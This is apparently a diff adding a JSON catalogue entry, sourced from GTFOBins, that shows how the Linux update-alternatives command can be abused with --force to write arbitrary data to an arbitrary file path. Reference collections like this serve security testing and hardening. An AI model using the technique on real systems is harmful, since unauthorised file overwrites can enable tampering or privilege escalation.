@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-update-alternatives-file-write",
+  "name": "GTFOBins · update-alternatives (file-write)",
+  "command": "echo DATA >/path/to/temp-file\nupdate-alternatives --force --install /path/to/output-file x /path/to/temp-file 0",
+  "description": "Use update-alternatives to file write via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "update-alternatives",
+    "file-write"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/update-alternatives/#file-write",
+  "upstream_id": "update-alternatives/file-write/0",
+  "category": "gtfobins",
+  "subcategory": "file-write",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/update-alternatives/"
+    }
+  ]
+}
